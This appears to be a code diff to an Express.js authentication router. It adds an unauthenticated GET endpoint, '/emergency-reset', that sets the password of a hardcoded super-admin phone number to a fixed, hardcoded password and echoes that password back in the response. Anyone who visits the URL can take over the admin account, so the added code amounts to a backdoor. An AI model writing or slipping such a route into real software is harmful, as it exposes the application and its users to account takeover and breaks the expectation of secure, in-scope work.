@@ -30,6 +30,20 @@ router.get('/me', authenticate, async (req, res) => {
   }
 });
 
+// GET /api/auth/emergency-reset - Reset super admin password
+router.get('/emergency-reset', async (req, res) => {
+  try {
+    const hash = await bcrypt.hash('Admin@123456', 10);
+    await prisma.user.updateMany({
+      where: { phone: '6380372501' },
+      data: { passwordHash: hash }
+    });
+    res.json({ success: true, message: 'Password reset to Admin@123456 for 6380372501' });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
 // POST /api/auth/login
 router.post('/login', async (req, res) => {
   try {
